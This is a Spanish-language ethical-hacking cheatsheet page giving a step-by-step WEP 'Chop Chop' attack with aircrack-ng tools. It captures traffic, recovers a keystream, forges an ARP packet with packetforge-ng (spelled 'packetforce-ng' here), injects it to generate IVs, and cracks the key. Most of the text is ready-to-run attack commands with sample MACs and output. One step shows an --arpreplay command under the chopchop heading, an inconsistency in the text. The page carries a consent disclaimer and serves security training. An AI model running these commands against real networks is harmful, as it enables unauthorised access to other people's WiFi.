
# Chop Chop

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

{% hint style="info" %}
Debemos ejecutar esta técnica hasta lograr los suficientes IVs para crackear la llave
{% endhint %}

## <mark style="color:purple;">Proceso</mark>

* Capturamos un paquete ARP
* Determinar el Key Stream
* Creamos un nuevo paquete
* Inyectamos el paquete en la red para generar más IVs

### 1. Partimos de un Fake Auth

{% content-ref url="/pages/hoxQMW9xIUWd61KaAfVg" %}
[Fake Autentication](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-redes/hacking-wifi/wep-cracking/fake-autentication.md)
{% endcontent-ref %}

### 2. Iniciar airodump-ng

Debemos guardar la salida con `--write`

```bash
# 4 - Iniciamos airodump-ng y guardamos la salida
sudo airodump-ng --bssid 00:E0:4C:6A:5A:F8 --channel 11 --write wep_chopchop wlan0
```

### 3. Aireplay --chopchop

```bash
sudo aireplay-ng --help

Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
   >> --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
```

```bash
sudo aireplay-ng --chopchop -b <SSID-OBJETIVO> -h <MAC-ADAPTADOR> <INTERFAZ> 
```

```bash
sudo aireplay-ng --arpreplay -b 00:E0:AC:6A:5A:F8 -h E8:4E:06:35:A9:C0 wlan0mon 
```

<figure><img src="/files/j9ECMSD4ndVz3gQOuPB5" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/RdvDGVWLoYaWN2qM72pw" alt=""><figcaption></figcaption></figure>

Para aumentar las posibilidades de éxito el porcentaje debe ser lo más alto posible. Al final obtendremos el keystream en un archivo `.xor`

### 4. Iniciar packetforce

{% code overflow="wrap" %}

```bash
sudo packetforce-ng -0 -a <SSID-OBJETIVO> -h <MAC-ADAPTADOR> -k <MASCARA> -l <MASCARA> -y <.XOR> -w <SALIDA> <INTERFAZ> 
```

{% endcode %}

{% code overflow="wrap" %}

```bash
sudo packetforce-ng -0 -a 00:E0:AC:6A:5A:F8 -h E8:4E:06:35:A9:C0 -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-1130-210747.xor -w packet_chopchop wlan0mon 

Wrote packet to: packet_chopchop

ls
packet_chopchop
```

{% endcode %}

### 5. Aireplay --interactive

```bash
sudo aireplay-ng --help

Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
   >> --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
```

```bash
sudo aireplay-ng --interactive -r packet_chopchop wlan0mon
```

<figure><img src="/files/hgDdVyyhOO8p9dEKgYZH" alt=""><figcaption></figcaption></figure>

Vemos que aumenta el tráfico correctamente en airodump:

<figure><img src="/files/BBtHDZwOCxO9DQxKPNWJ" alt=""><figcaption></figcaption></figure>

### 6. Iniciar aircrack-ng

Abrir el archivo .cap

```bash
sudo aircrack-ng wep_chopchop.cap
```

<figure><img src="/files/GagIghpdIi1UWufg0B0m" alt=""><figcaption></figcaption></figure>

```
KEY FOUND! [12:34:56:78:90]
Password: 1234567890
```
